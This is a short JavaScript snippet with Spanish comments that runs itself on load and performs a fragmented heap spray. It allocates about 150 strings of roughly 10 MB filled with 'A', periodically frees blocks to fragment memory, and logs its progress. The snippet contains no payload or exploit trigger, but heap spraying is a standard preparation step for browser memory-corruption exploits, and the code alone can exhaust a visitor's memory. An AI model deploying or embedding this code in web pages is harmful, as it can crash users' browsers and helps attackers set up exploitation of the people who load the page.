(function() {
    const sprayArray = [];
    const largeObjectSize = 0x999000;  // 10 MB por objeto
    const iterations = 150;            // Iteraciones para ocupación progresiva

    async function fragmentedHeapSpray() {
        for (let i = 0; i < iterations; i++) {
            // Crear y almacenar bloques de memoria grandes
            let largeObject = "A".repeat(largeObjectSize);
            sprayArray.push(largeObject);

            // Liberar cada 20 iteraciones para inducir fragmentación
            if (i % 20 === 0 && sprayArray.length > 50) {
                sprayArray.splice(0, 10);  // Eliminar bloques antiguos
                console.log(`[+] Iteración ${i + 1}: Liberados y reasignados bloques.`);
            }

            // Pausa breve para reducir carga instantánea
            await new Promise(resolve => setTimeout(resolve, 50));
        }
        console.log("[+] Heap spraying con fragmentación compleja completado.");
        alert("Heap spraying fragmentado completado.");
    }

    fragmentedHeapSpray();
})();
